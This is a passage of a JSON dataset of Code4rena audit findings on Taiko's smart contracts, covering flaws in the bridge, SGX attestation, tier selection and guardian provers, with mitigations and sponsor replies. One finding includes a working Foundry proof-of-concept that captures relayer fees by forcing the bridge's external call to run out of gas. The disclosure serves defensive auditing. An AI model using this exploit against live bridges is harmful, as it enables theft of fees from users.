      "content": "\n[Link](https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/L1/TaikoToken.sol#L25)\n\nContextUpgradeable is not initialized in TaikoToken.sol contract. This contract is used in ERC20PermitUpgradeable which is used in ERC20VotesUpgradeable. But neither contract initializes this Context contract when the contracts themselves are intialized. \n\nIn TaikoToken.sol [here](https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/L1/TaikoToken.sol#L25), we can see that the below __Context_init() function is not called.\n```solidity\nFile: ContextUpgradeable.sol\n18:     function __Context_init() internal onlyInitializing {\n19:     }\n20: \n21:     function __Context_init_unchained() internal onlyInitializing {\n22:     }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Taiko",
      "source_link": "https://code4rena.com/reports/2024-03-taiko",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "31947",
      "title": "[M-14] Malicious caller of `processMessage()` can pocket the fee while forcing `excessivelySafeCall()` to fail",
      "impact": "MEDIUM",
      "content": "\nThe logic inside function `processMessage()` [provides a reward to the msg.sender](https://github.com/code-423n4/2024-03-taiko/blob/main/packages/protocol/contracts/bridge/Bridge.sol#L298) if they are not the `refundTo` address. However this reward or `_message.fee` is awarded even if the `_invokeMessageCall()` on [L282](https://github.com/code-423n4/2024-03-taiko/blob/main/packages/protocol/contracts/bridge/Bridge.sol#L282) fails and the message goes into a `RETRIABLE` state. In the retriable state, it has to be called by someone again and the current `msg.sender` has no obligation to be the one to call it.\n\nThis logic can be gamed by a malicious user using the **63/64th rule specified in** [EIP-150](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-150.md).\n\n```js\n  File: contracts/bridge/Bridge.sol\n\n  278:                          // Use the specified message gas limit if called by the owner, else\n  279:                          // use remaining gas\n  280: @--->                    uint256 gasLimit = msg.sender == _message.destOwner ? gasleft() : _message.gasLimit;\n  281:\n  282: @--->                    if (_invokeMessageCall(_message, msgHash, gasLimit)) {\n  283:                              _updateMessageStatus(msgHash, Status.DONE);\n  284:                          } else {\n  285: @--->                        _updateMessageStatus(msgHash, Status.RETRIABLE);\n  286:                          }\n  287:                      }\n  288:\n  289:                      // Determine the refund recipient\n  290:                      address refundTo =\n  291:                          _message.refundTo == address(0) ? _message.destOwner : _message.refundTo;\n  292:\n  293:                      // Refund the processing fee\n  294:                      if (msg.sender == refundTo) {\n  295:                          refundTo.sendEther(_message.fee + refundAmount);\n  296:                      } else {\n  297:                          // If sender is another address, reward it and refund the rest\n  298: @--->                    msg.sender.sendEther(_message.fee);\n  299:                          refundTo.sendEther(refundAmount);\n  300:                      }\n```\n\n### Description\n\nThe `_invokeMessageCall()` on [L282](https://github.com/code-423n4/2024-03-taiko/blob/main/packages/protocol/contracts/bridge/Bridge.sol#L282) internally calls `excessivelySafeCall()` on [L497](https://github.com/code-423n4/2024-03-taiko/blob/main/packages/protocol/contracts/bridge/Bridge.sol#L497). When `excessivelySafeCall()` makes an external call, only 63/64th of the gas is used by it. Thus the following scenario can happen:\n\n*   Malicious user notices that [L285-L307](https://github.com/code-423n4/2024-03-taiko/blob/main/packages/protocol/contracts/bridge/Bridge.sol#L285-L307) uses approx 165\\_000 gas.\n\n*   He also notices that [L226-L280](https://github.com/code-423n4/2024-03-taiko/blob/main/packages/protocol/contracts/bridge/Bridge.sol#L226-L280) uses approx 94\\_000 gas.\n\n*   He calculates that he must provide approximately a minimum of `94000 + (64 * 165000) = 10_654_000` gas so that the function execution does not revert anywhere.\n\n*   Meanwhile, a message owner has message which has a `_message.gasLimit` of 11\\_000\\_000. This is so because the `receive()` function of the contract receiving ether is expected to consume gas in this range due to its internal calls & transactions. The owner expects at least 10\\_800\\_000 of gas would be used up and hence has provided some extra buffer.\n\n*   Note that **any message** that has a processing requirement of greater than `63 * 165000 = 10_395_000` gas can now become a target of the malicious user.\n\n*   Malicious user now calls `processMessage()` with a specific gas figure. Let's use an example figure of `{gas: 10_897_060}`. This means only `63/64 * (10897060 - 94000) = 10_634_262` is forwarded to `excessivelySafeCall()` and `1/64 * (10897060 - 94000) = 168_797` will be kept back which is enough for executing the remaining lines of code L285-L307. Note that since `(10897060 - 94000) = 10_803_060` which is less than the message owner's provided `_message.gasLimit` of `11_000_000`, what actually gets considered is only `10_803_060`.\n\n*   The external call reverts inside `receive()` due to out of gas error (since 10\\_634\\_262 < 10\\_800\\_000) and hence `_success` is set to `false` on [L44](https://github.com/code-423n4/2024-03-taiko/blob/main/packages/protocol/contracts/thirdparty/nomad-xyz/ExcessivelySafeCall.sol#L44).\n\n*   The remaining L285-L307 are executed and the malicious user receives his reward.\n\n*   The message goes into `RETRIABLE` state now and someone will need to call `retryMessage()` later on.\n\nA different bug report titled ***\"No incentive for message non-owners to retryMessage()\"*** has also been raised which highlights the incentivization scheme of `retryMessage()`.\n\n### Impact\n\n*   Protocol can be gamed by a user to gain rewards while additionaly saving money by providing the least possible gas.\n\n*   There is no incentive for any external user now to ever provide more than `{gas: 10_897_060}` (approx figure).\n\n### Proof of Concept\n\nApply the following patch to add the test inside `protocol/test/bridge/Bridge.t.sol` and run via `forge test -vv --mt test_t0x1c_gasManipulation` to see it pass:\n\n<details>\n\n```diff\ndiff --git a/packages/protocol/test/bridge/Bridge.t.sol b/packages/protocol/test/bridge/Bridge.t.sol\nindex 6b7dca6..ce77ce2 100644\n--- a/packages/protocol/test/bridge/Bridge.t.sol\n+++ b/packages/protocol/test/bridge/Bridge.t.sol\n@@ -1,11 +1,19 @@\n // SPDX-License-Identifier: MIT\n pragma solidity 0.8.24;\n \n import \"../TaikoTest.sol\";\n \n+contract ToContract {\n+    receive() external payable {\n+        uint someVar;\n+        for(uint loop; loop < 86_990; ++loop)\n+            someVar += 1e18;\n+    }\n+}\n+\n // A contract which is not our ErcXXXTokenVault\n // Which in such case, the sent funds are still recoverable, but not via the\n // onMessageRecall() but Bridge will send it back\n contract UntrustedSendMessageRelayer {\n     function sendMessage(\n         address bridge,\n@@ -115,12 +123,71 @@ contract BridgeTest is TaikoTest {\n         register(address(addressManager), \"bridge\", address(destChainBridge), destChainId);\n \n         register(address(addressManager), \"taiko\", address(uint160(123)), destChainId);\n         vm.stopPrank();\n     }\n \n+    \n+    function test_t0x1c_gasManipulation() public {\n+        //**************** SETUP **********************\n+        ToContract toContract = new ToContract();\n+        IBridge.Message memory message = IBridge.Message({\n+            id: 0,\n+            from: address(bridge),\n+            srcChainId: uint64(block.chainid),\n+            destChainId: destChainId,\n+            srcOwner: Alice,\n+            destOwner: Alice,\n+            to: address(toContract),\n+            refundTo: Alice,\n+            value: 1000,\n+            fee: 1000,\n+            gasLimit: 11_000_000,\n+            data: \"\",\n+            memo: \"\"\n+        });\n+        // Mocking proof - but obviously it needs to be created in prod\n+        // corresponding to the message\n+        bytes memory proof = hex\"00\";\n+\n+        bytes32 msgHash = destChainBridge.hashMessage(message);\n+\n+        vm.chainId(destChainId);\n+        skip(13 hours);\n+        assertEq(destChainBridge.messageStatus(msgHash) == IBridge.Status.NEW, true);\n+        uint256 carolInitialBalance = Carol.balance;\n+\n+        uint256 snapshot = vm.snapshot();\n+        //**************** SETUP ENDS **********************\n+\n+\n+\n+        //**************** NORMAL USER **********************\n+        console.log(\"\\n**************** Normal User ****************\");\n+        vm.prank(Carol, Carol);\n+        destChainBridge.processMessage(message, proof);\n+\n+        assertEq(destChainBridge.messageStatus(msgHash) == IBridge.Status.DONE, true);\n+        assertEq(Carol.balance, carolInitialBalance + 1000, \"Carol balance mismatch\");\n+        if (destChainBridge.messageStatus(msgHash) == IBridge.Status.DONE)\n+            console.log(\"message status = DONE\");\n+\n+\n+\n+        //**************** MALICIOUS USER **********************\n+        vm.revertTo(snapshot);\n+        console.log(\"\\n**************** Malicious User ****************\");\n+        vm.prank(Carol, Carol);\n+        destChainBridge.processMessage{gas: 10_897_060}(message, proof); // @audit-info : specify gas to force failure of excessively safe external call\n+\n+        assertEq(destChainBridge.messageStatus(msgHash) == IBridge.Status.RETRIABLE, true); // @audit : message now in RETRIABLE state. Carol receives the fee.\n+        assertEq(Carol.balance, carolInitialBalance + 1000, \"Carol balance mismatched\");\n+        if (destChainBridge.messageStatus(msgHash) == IBridge.Status.RETRIABLE)\n+            console.log(\"message status = RETRIABLE\");\n+    }\n+\n     function test_Bridge_send_ether_to_to_with_value() public {\n         IBridge.Message memory message = IBridge.Message({\n             id: 0,\n             from: address(bridge),\n             srcChainId: uint64(block.chainid),\n             destChainId: destChainId,\n```\n\n</details>\n\n### Tools Used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nReward the `msg.sender` (provided it's a *non-refundTo* address) with `_message.fee` only if `_invokeMessageCall()` returns `true`. Additionally, it is advisable to release this withheld reward after a successful `retryMessage()` to that function's caller.\n\n\n**[dantaik (Taiko) confirmed and commented](https://github.com/code-423n4/2024-03-taiko-findings/issues/97#issuecomment-2032446424):**\n > Fixed in https://github.com/taikoxyz/taiko-mono/pull/16613\n> \n> I don't think paying fees only when `_invokeMessageCall` returns true is a good idea as this will require the relayer to simulate all transactions without guaranteed reward.\n\n***\n\n",
      "summary": "\nSummary:\n\nThe bug report discusses a vulnerability in the `processMessage()` function of the `Bridge` contract. This function provides a reward to the `msg.sender` if they are not the `refundTo` address, even if the `_invokeMessageCall()` fails and the message goes into a `RETRIABLE` state. This can be exploited by a malicious user using the 63/64th rule specified in EIP-150, which allows them to gain rewards and save money by providing the least possible gas. The impact of this bug is that the protocol can be manipulated and there is no incentive for external users to provide more gas than needed. A proof of concept has been provided and the bug can be fixed by only rewarding the `msg.sender` if `_invokeMessageCall()` returns true. It is also recommended to release the withheld reward after a successful `retryMessage()` to incentivize its use. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Taiko",
      "source_link": "https://code4rena.com/reports/2024-03-taiko",
      "github_link": "https://github.com/code-423n4/2024-03-taiko-findings/issues/97",
      "tags": [],
      "finders": [
        "Shield",
        "ladboy233",
        "t0x1c"
      ]
    },
    {
      "id": "31946",
      "title": "[M-13] Taiko SGX Attestation - Improper validation in certchain decoding",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2024-03-taiko/blob/0d081a40e0b9637eddf8e760fabbecc250f23599/packages/protocol/contracts/automata-attestation/lib/PEMCertChainLib.sol#L135> \n\n<https://github.com/code-423n4/2024-03-taiko/blob/0d081a40e0b9637eddf8e760fabbecc250f23599/packages/protocol/contracts/verifiers/SgxVerifier.sol#L115-L136>\n\nAs part of of its ZK proof setup, Taiko leverages SGX provers. it also enables remote SGX attestation and this is possible via leveraging code from Automata, which provides a modular attestation layer extending machine-level trust to Ethereum via the AutomataDcapV3Attestation repo, which is in scope of this audit.\n\nAnyone with SGX hardware can register their instance to be an SGX prover in the Taiko Network via calling the registerInstance function in SgxVerifier.sol. This is why attestation is critical to prove the reliability and trustworthiness of the SGX prover.\n\nThe attestation process of SGX provers is a multi fold process, and starts with calling the verifyParsedQuote function in AutomataDcapV3Attestation.sol. One of the steps involves decoding the certchain provided by the SGX prover, as seen below:\n\n            // Step 4: Parse Quote CertChain\n        IPEMCertChainLib.ECSha256Certificate[] memory parsedQuoteCerts;\n        TCBInfoStruct.TCBInfo memory fetchedTcbInfo;\n        {\n            // 536k gas\n            parsedQuoteCerts = new IPEMCertChainLib.ECSha256Certificate[](3);\n            for (uint256 i; i < 3; ++i) {\n                bool isPckCert = i == 0; // additional parsing for PCKCert\n                bool certDecodedSuccessfully;\n                // todo! move decodeCert offchain\n                (certDecodedSuccessfully, parsedQuoteCerts[i]) = pemCertLib.decodeCert(\n                    authDataV3.certification.decodedCertDataArray[i], isPckCert\n                );\n                if (!certDecodedSuccessfully) {\n                    return (false, retData);\n                }\n            }\n        }\n\nafter this step is executed, a number of other steps are done including:\n\nStep 5: basic PCK and TCB check\nStep 6: Verify TCB Level\nStep 7: Verify cert chain for PCK\nStep 8: Verify the local attestation sig and qe report sig\n\nThe decoding of the certchain happens through the EMCertChainLib lib, and this involves a number of steps, one of which is to validate the decoded notBefore and notAfter tags of the certificate:\n\n            {\n            uint256 notBeforePtr = der.firstChildOf(tbsPtr);\n            uint256 notAfterPtr = der.nextSiblingOf(notBeforePtr);\n            bytes1 notBeforeTag = der[notBeforePtr.ixs()];\n            bytes1 notAfterTag = der[notAfterPtr.ixs()];\n            if (\n                (notBeforeTag != 0x17 && notBeforeTag == 0x18)\n                    || (notAfterTag != 0x17 && notAfterTag != 0x18)\n            ) {\n                return (false, cert);\n            }\n            cert.notBefore = X509DateUtils.toTimestamp(der.bytesAt(notBeforePtr));\n            cert.notAfter = X509DateUtils.toTimestamp(der.bytesAt(notAfterPtr));\n        }\n\nThese fields determine the time format, whether the notBeforePtr and notAfterPtr are in UTC or generalized time, and are used to ensure consistency in timestamps used to determine the validity period of the certificate.\n\nHowever the validation can fail because the logic above is faulty, as it will allow the attestor to pass in any value for the notBefore tag, indeeed the condition of:\n\n    (notBeforeTag != 0x17 && notBeforeTag == 0x18)\n\nwill allow the attestor to pass in any beforetag because the condition will always be false.\n\nConsider if we pass an invalid tag of 0x10:\n\n1.  notBeforeTag != 0x17 is True.\n2.  notBeforeTag == 0x18 is False.\n3.  full condition is False.\n\nI believe the original intention was to ensure the beforeTag is strictly 0x17 or 0x18, just as with the afterTag. Because of this oversight, a malicious attestor could pass in any notBefore Tag as part of their certificate.\n\nThis issue requires attention given the significance of the attestation process of SGX provers within Taiko's ZK setup. The whole point of attestation is to prove the SGX provers are secure, untampered, and trustworthy, and improper validation related to certificate validity periods can have unforeseen consequences.\n\n### Recommended Mitigation Steps\n\nUpdate the condition as below:\n\n                if (\n                (notBeforeTag != 0x17 && notBeforeTag != 0x18)\n                    || (notAfterTag != 0x17 && notAfterTag != 0x18)\n            ) {\n                return (false, cert);\n\n\n**[smtmfft (Taiko) confirmed and commented](https://github.com/code-423n4/2024-03-taiko-findings/issues/168#issuecomment-2033492460):**\n > I think this is a valid catch, already submitted a fix.\n\n***\n\n",
      "summary": "\nThis bug report discusses an issue with the attestation process for SGX provers in the Taiko network. The process involves decoding a certificate chain provided by the prover, and one of the steps is to validate the notBefore and notAfter tags of the certificate. However, the current logic allows for any value to be passed in for the notBefore tag, which could potentially be exploited by a malicious prover. The report recommends updating the condition to ensure that only valid values are accepted for the notBefore tag. The Taiko team has confirmed the issue and submitted a fix. This is an important issue to address as the attestation process is crucial for ensuring the security and trustworthiness of SGX provers in the Taiko network. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Taiko",
      "source_link": "https://code4rena.com/reports/2024-03-taiko",
      "github_link": "https://github.com/code-423n4/2024-03-taiko-findings/issues/168",
      "tags": [],
      "finders": [
        "zzebra83"
      ]
    },
    {
      "id": "31945",
      "title": "[M-12] Invocation delays are not honoured when protocol unpauses",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2024-03-taiko/blob/main/packages/protocol/contracts/common/EssentialContract.sol#L78> \n\n<https://github.com/code-423n4/2024-03-taiko/blob/main/packages/protocol/contracts/bridge/Bridge.sol#L258>\n\n***Context:*** The protocol has `pause()` and [unpause()](https://github.com/code-423n4/2024-03-taiko/blob/main/packages/protocol/contracts/common/EssentialContract.sol#L78) functions inside `EssentialContract.sol` which are tracked throughout the protocol via the modifiers [whenPaused](https://github.com/code-423n4/2024-03-taiko/blob/main/packages/protocol/contracts/common/EssentialContract.sol#L53) and [whenNotPaused](https://github.com/code-423n4/2024-03-taiko/blob/main/packages/protocol/contracts/common/EssentialContract.sol#L58).\n\n***Issue:*** Various delays and time lapses throughout the protocol ignore the effect of such pauses. The example in focus being that of `processMessage()` which does not take into account the pause duration while [checking invocationDelay and invocationExtraDelay](https://github.com/code-423n4/2024-03-taiko/blob/main/packages/protocol/contracts/bridge/Bridge.sol#L233-L258). One impact of this is that it allows a non-preferred executor to front run a preferredExecutor, after an unpause.\n\n```js\n  File: contracts/bridge/Bridge.sol\n\n  233: @--->            (uint256 invocationDelay, uint256 invocationExtraDelay) = getInvocationDelays();\n  234:          \n  235:                  if (!isMessageProven) {\n  236:                      if (!_proveSignalReceived(signalService, msgHash, _message.srcChainId, _proof)) {\n  237:                          revert B_NOT_RECEIVED();\n  238:                      }\n  239:          \n  240:                      receivedAt = uint64(block.timestamp);\n  241:          \n  242:                      if (invocationDelay != 0) {\n  243:                          proofReceipt[msgHash] = ProofReceipt({\n  244:                              receivedAt: receivedAt,\n  245:                              preferredExecutor: _message.gasLimit == 0 ? _message.destOwner : msg.sender\n  246:                          });\n  247:                      }\n  248:                  }\n  249:          \n  250:                  if (invocationDelay != 0 && msg.sender != proofReceipt[msgHash].preferredExecutor) {\n  251:                      // If msg.sender is not the one that proved the message, then there\n  252:                      // is an extra delay.\n  253:                      unchecked {\n  254:                          invocationDelay += invocationExtraDelay;\n  255:                      }\n  256:                  }\n  257:          \n  258: @--->            if (block.timestamp >= invocationDelay + receivedAt) {\n```\n\n### Description & Impact\n\nConsider the following flow:\n\n*   Assumption: `invocationDelay = 60 minutes` and `invocationExtraDelay = 30 minutes`.\n*   A message is sent.\n*   First call to `processMessage()` occurred at `t` where it was proven by Bob i.e. its `receivedAt = t`. Bob is marked as the `preferredExecutor`.\n*   Preferred executor should be able to call `processMessage()` at `t+60` while a non-preferred executor should be able to call it only at `t+90` due to the code logic on [L250](https://github.com/code-423n4/2024-03-taiko/blob/main/packages/protocol/contracts/bridge/Bridge.sol#L250).\n*   At `t+55`, protocol is paused.\n*   At `t+100`, protocol is unpaused.\n*   ***Impact:*** The 30-minute time window advantage which the preferred executor had over the non-preferred one is now lost to him. [L258](https://github.com/code-423n4/2024-03-taiko/blob/main/packages/protocol/contracts/bridge/Bridge.sol#L258) now considers the invocation delays to have passed and hence the non-preferred executor can immediately call `processMessage()` by front-running Bob and hence pocketing the reward of `message.fee` on [L98](https://github.com/code-423n4/2024-03-taiko/blob/main/packages/protocol/contracts/bridge/Bridge.sol#L298).\n\n```js\n  File: contracts/bridge/Bridge.sol\n\n  293:                      // Refund the processing fee\n  294:                      if (msg.sender == refundTo) {\n  295:                          refundTo.sendEther(_message.fee + refundAmount);\n  296:                      } else {\n  297:                          // If sender is another address, reward it and refund the rest\n  298: @--->                    msg.sender.sendEther(_message.fee);\n  299:                          refundTo.sendEther(refundAmount);\n  300:                      }\n```\n\nSimilar behaviour where the paused time is ignored by the protocol can be witnessed in:\n\n*   [recallMessage()](https://github.com/code-423n4/2024-03-taiko/blob/main/packages/protocol/contracts/bridge/Bridge.sol#L187-L189) which similarly uses `invocationDelay`. However, no `invocationExtraDelay` is used there.\n*   [TimelockTokenPool.sol](https://github.com/code-423n4/2024-03-taiko/blob/main/packages/protocol/contracts/team/TimelockTokenPool.sol) for:\n\n```js\n        // If non-zero, indicates the start time for the recipient to receive\n        // tokens, subject to an unlocking schedule.\n        uint64 grantStart;\n        // If non-zero, indicates the time after which the token to be received\n        // will be actually non-zero\n        uint64 grantCliff;\n        // If non-zero, specifies the total seconds required for the recipient\n        // to fully own all granted tokens.\n        uint32 grantPeriod;\n        // If non-zero, indicates the start time for the recipient to unlock\n        // tokens.\n        uint64 unlockStart;\n        // If non-zero, indicates the time after which the unlock will be\n        // actually non-zero\n        uint64 unlockCliff;\n        // If non-zero, specifies the total seconds required for the recipient\n        // to fully unlock all owned tokens.\n        uint32 unlockPeriod;\n```\n\n*   [TaikoData.sol](https://github.com/code-423n4/2024-03-taiko/blob/main/packages/protocol/contracts/L1/TaikoData.sol) for:\n\n```js\n        // The max period in seconds that a blob can be reused for DA.\n        uint24 blobExpiry;\n```\n\n### Recommended Mitigation Steps\n\nIntroduce a new variable which keeps track of how much time has already been spent in the valid wait window before a pause happened. Also track the last unpause timestamp (similar to how it is done in [pauseProving()](https://github.com/code-423n4/2024-03-taiko/blob/main/packages/protocol/contracts/L1/TaikoL1.sol#L111) and [unpausing](https://github.com/code-423n4/2024-03-taiko/blob/main/packages/protocol/contracts/L1/TaikoL1.sol#L124) mechanisms).\nAlso refer my other recommendation under the report titled: *\"Incorrect calculations for cooldownWindow and provingWindow could cause a state transition to spend more than expected time in these windows\"*. That will help fix the issue without any further leaks.\n\n**[dantaik (Taiko) confirmed and commented](https://github.com/code-423n4/2024-03-taiko-findings/issues/170#issuecomment-2032338122):**\n > This is a valid bug report, fixing in https://github.com/taikoxyz/taiko-mono/pull/16612\n >\n > TimelockTokenPool.sol will not have a similar fix as the risk is very managable. Blob caching/sharing is disabled, so no fix for it as well.\n\n***\n\n",
      "summary": "\nThis bug report discusses an issue where the protocol's `pause()` and `unpause()` functions are not being properly accounted for in various parts of the code. Specifically, the `processMessage()` function does not take into account the pause duration when checking for delays, allowing a non-preferred executor to front run a preferred executor after an unpause. This can result in the non-preferred executor receiving a reward that was meant for the preferred executor. The report recommends introducing a new variable to track the time spent in the wait window before a pause and fixing the calculations for the cooldown window and proving window. The bug has been confirmed and a fix has been implemented. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Taiko",
      "source_link": "https://code4rena.com/reports/2024-03-taiko",
      "github_link": "https://github.com/code-423n4/2024-03-taiko-findings/issues/170",
      "tags": [],
      "finders": [
        "t0x1c"
      ]
    },
    {
      "id": "31944",
      "title": "[M-11] Proposers would choose to avoid higher tier by exploiting non-randomness of parameter used in getMinTier()",
      "impact": "MEDIUM",
      "content": "\nThe issue exists for both `MainnetTierProvider.sol` and `TestnetTierProvider.sol`. For this report, we shall concentrate only on describing it via `MainnetTierProvider.sol`.\n\nThe proving tier is chosen by the [getMinTier()](https://github.com/code-423n4/2024-03-taiko/blob/main/packages/protocol/contracts/L1/tiers/MainnetTierProvider.sol#L66-L70) function which accepts a `_rand` param.\n\n```js\n  File: contracts/L1/tiers/MainnetTierProvider.sol\n\n  66:               function getMinTier(uint256 _rand) public pure override returns (uint16) {\n  67:                   // 0.1% require SGX + ZKVM; all others require SGX\n  68: @--->             if (_rand % 1000 == 0) return LibTiers.TIER_SGX_ZKVM;\n  69:                   else return LibTiers.TIER_SGX;\n  70:               }\n```\n\nIf `_rand % 1000 == 0`, a costlier tier `TIER_SGX_ZKVM` is used instead of the cheaper `TIER_SGX`. The `_rand` param is passed in the form of `meta_.difficulty` [which is calculated inside](https://github.com/code-423n4/2024-03-taiko/blob/main/packages/protocol/contracts/L1/libs/LibProposing.sol#L199-L209) `proposeBlock()`:\n\n```js\n  File: contracts/L1/libs/LibProposing.sol\n\n  199:                  // Following the Merge, the L1 mixHash incorporates the\n  200:                  // prevrandao value from the beacon chain. Given the possibility\n  201:                  // of multiple Taiko blocks being proposed within a single\n  202:                  // Ethereum block, we choose to introduce a salt to this random\n  203:                  // number as the L2 mixHash.\n  204: @--->            meta_.difficulty = keccak256(abi.encodePacked(block.prevrandao, b.numBlocks, block.number));\n  205:          \n  206:                  // Use the difficulty as a random number\n  207:                  meta_.minTier = ITierProvider(_resolver.resolve(\"tier_provider\", false)).getMinTier(\n  208: @--->                uint256(meta_.difficulty)\n  209:                  );\n```\n\nAs can be seen, all the parameters used in L204 to calculate `meta_.difficulty` can be known in advance and hence a proposer can choose not to propose when `meta_.difficulty` modulus 1000 equals zero, because in such cases it will cost him more to afford the proof (sgx + zk proof in this case).\n\n### Impact\n\nSince the proposer will now wait for the next or any future block to call `proposeBlock()` instead of the current costlier one, **transactions will now take longer to finalilze**.\n\nIf `_rand` were truly random, it would have been an even playing field in all situations as the proposer wouldn't be able to pick & choose since he won't know in advance which tier he might get. We would then truly have:\n\n```js\n  67:                   // 0.1% require SGX + ZKVM; all others require SGX\n```\n\n### Recommended Mitigation Steps\n\nConsider using VRF like solutions to make `_rand` truly random.\n\n**[dantaik (Taiko) acknowledged and commented](https://github.com/code-423n4/2024-03-taiko-findings/issues/172#issuecomment-2032346577):**\n > This is a very well known issue.\n> \n> Using VRF creates a third party dependency which may be a bigger risk for a Based rollup. We'll monitor how this plays out and mitigate the issue later.\n\n**[adaki2004 (Taiko) commented](https://github.com/code-423n4/2024-03-taiko-findings/issues/172#issuecomment-2034096641):**\n > Eventually we will have only 1 (1 \"aggregated ZK multiproof\") proof tier, which will be the default/min too. (Maybe keeping guardian for a while to be as a failsafe, but that one also cannot be \"picked\" with thispseudoe random calculation).\n> Also Taiko foundation will run a proposer node, so in case noone is willing to propose to avoid fees, we will, regardless of cost - at least until we reach the 1 tier maturity.\n\n**[genesiscrew (Warden) commented](https://github.com/code-423n4/2024-03-taiko-findings/issues/172#issuecomment-2048545898):**\n > Considering this report and the responses from the sponsors, I am unable to see how this would impact the function of the protocol in such a way that would deem it a medium risk. I personally think this is informational. The report states proving will take longer because it assumes all proposers will want to avoid paying fees because they can predict the block difficulty. I find that a bit of a stretch.\n\n**[adaki2004 (Taiko) commented](https://github.com/code-423n4/2024-03-taiko-findings/issues/172#issuecomment-2049215839):**\n> Not the proving but the liveness (proposing) would take longer as provers would deny to grant signatures to prove blocks - which's evaluation i happening during `proposeBlock`. \n> \n> But at least +2 years post mainnet taiko foundation is commited to `proposeBlock` every X time intervals (even if not breaking even) to keep the liveness and get over this.\n> \n> And as stated, by the time hopefully this minTier() will vanish in that time - hopefully even in months after launch (not years) when ZK is cheap enough. So for now we would say it is a known issue, we are aware of.\n\n**[t0x1c (Warden) commented](https://github.com/code-423n4/2024-03-taiko-findings/issues/172#issuecomment-2051225141):**\n > Thank you for the inputs. From what I see, this is being acknowledged by the sponsor as a valid issue which is known to the team.\n> Also important to note that it wasn't mentioned in the list of C4 \"known issues\" section on the audit page, so should qualify as a Medium. \n\n**[adaki2004 (Taiko) commented](https://github.com/code-423n4/2024-03-taiko-findings/issues/172#issuecomment-2051231358):**\n> Can accept medium.\n\n***\n\n",
      "summary": "\nThis bug report discusses an issue in the `MainnetTierProvider.sol` and `TestnetTierProvider.sol` contracts. These contracts use a function called `getMinTier()` to choose the proving tier for a particular block. If a certain condition is met, a more expensive tier is used instead of a cheaper one. This condition is determined by a parameter called `_rand`, which is calculated in the `proposeBlock()` function. However, it is possible for a proposer to predict the value of `_rand` and choose not to propose a block, resulting in longer transaction finalization times. The team is aware of this issue and is considering using a solution called VRF to make `_rand` truly random. They also plan to have a proposer node to ensure liveness in case no one is willing to propose a block. The team believes this issue will be resolved in a few months after the launch of the protocol. This issue was not mentioned in the list of known issues on the audit page, so it is considered a medium risk.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Taiko",
      "source_link": "https://code4rena.com/reports/2024-03-taiko",
      "github_link": "https://github.com/code-423n4/2024-03-taiko-findings/issues/172",
      "tags": [],
      "finders": [
        "Mahi\\_Vasisth",
        "t0x1c"
      ]
    },
    {
      "id": "31943",
      "title": "[M-10] The decision to return the liveness bond depends solely on the last guardian",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/L1/provers/GuardianProver.sol#L46> \n\n<https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/L1/libs/LibProving.sol#L192>\n\n### Vulnerability details\n\nThe `GuardianProver` contract is a multisig that might contest any proof in some exceptional cases (bugs in the prover or verifier). To contest a proof, a predefined number of guardians should approve a hash of the message that includes `_meta` and `_tran`.\n\n```solidity\nfunction approve(\n    TaikoData.BlockMetadata calldata _meta,\n    TaikoData.Transition calldata _tran,\n    TaikoData.TierProof calldata _proof\n)\n    external\n    whenNotPaused\n    nonReentrant\n    returns (bool approved_)\n{\n    if (_proof.tier != LibTiers.TIER_GUARDIAN) revert INVALID_PROOF();\n\n    bytes32 hash = keccak256(abi.encode(_meta, _tran));\n    approved_ = approve(_meta.id, hash);\n\n    if (approved_) {\n        deleteApproval(hash);\n        ITaikoL1(resolve(\"taiko\", false)).proveBlock(_meta.id, abi.encode(_meta, _tran, _proof));\n    }\n\n    emit GuardianApproval(msg.sender, _meta.id, _tran.blockHash, approved_);\n}\n```\n\nThe issue arises from the fact that the approved message doesn't include the `_proof`. It means that the last approving guardian can provide any desired value in the `_proof`. The data from the `_proof` is used to determine whether it is necessary to return the liveness bond to the assigned prover or not:\n\n```solidity\nif (isTopTier) {\n    // A special return value from the top tier prover can signal this\n    // contract to return all liveness bond.\n    bool returnLivenessBond = blk.livenessBond > 0 && _proof.data.length == 32\n        && bytes32(_proof.data) == RETURN_LIVENESS_BOND;\n\n    if (returnLivenessBond) {\n        tko.transfer(blk.assignedProver, blk.livenessBond);\n        blk.livenessBond = 0;\n    }\n}\n```\n\nAs a result, the last guardian can solely decide whether to return the liveness bond to the assigned prover or not.\n\n### Impact\n\nThe decision to return the liveness bond depends solely on the last guardian.\n\n### Recommended Mitigation Steps\n\nConsider including the `_proof` in the approved message.\n\n```solidity\nbytes32 hash = keccak256(abi.encode(_meta, _tran, _proof));\n```\n\n**[dantaik (Taiko) confirmed and commented](https://github.com/code-423n4/2024-03-taiko-findings/issues/205#issuecomment-2079069856):**\n >Now guardian provers must also agree on whether liveness bond should be returned bytes32(_proof.data) == LibStrings.H_RETURN_LIVENESS_BOND, so the hash they sign is now:\n >\n >bytes32 hash = keccak256(abi.encode(_meta, _tran, _proof.data));\n >\n >rather than the previous code:\n >\n >bytes32 hash = keccak256(abi.encode(_meta, _tran));\n***\n\n",
